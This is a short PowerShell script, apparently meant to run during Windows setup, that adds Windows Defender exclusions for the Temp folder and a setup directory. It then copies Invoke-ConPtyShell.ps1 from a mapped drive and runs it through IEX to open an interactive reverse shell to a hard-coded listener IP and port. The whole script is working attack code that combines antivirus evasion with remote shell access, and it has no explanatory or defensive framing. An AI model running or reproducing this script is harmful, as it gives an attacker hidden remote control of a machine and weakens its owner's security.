#connection variables:
$ListenerIP = "172.20.103.158"
$ListenerPort = "35500"

#add Windows Defender Exclusions:
$Preferences = Get-MpPreference
$CurrExclusionPaths = $Preferences.ExclusionPath
$TempExcl = "C:\Users\$($env:UserName)\AppData\Local\Temp"
if($CurrExclusionPaths -ne $null){
    Set-MpPreference -ExclusionPath $CurrExclusionPaths, C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, $TempExcl
} else {Set-MpPreference -ExclusionPath C:\Windows\Setup\State, C:\Windows\Setup\State\Setup.ps1, C:\Windows\Setup\State\Invoke-ConPtyShell.ps1, $TempExcl}

#copy connection script:
Copy-Item -Path Z:\Invoke-ConPtyShell.ps1 -Destination C:\Windows\Setup\State\Invoke-ConPtyShell.ps1

#run connection script:
IEX(IWR C:\Windows\Setup\State\Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $ListenerIP $ListenerPort
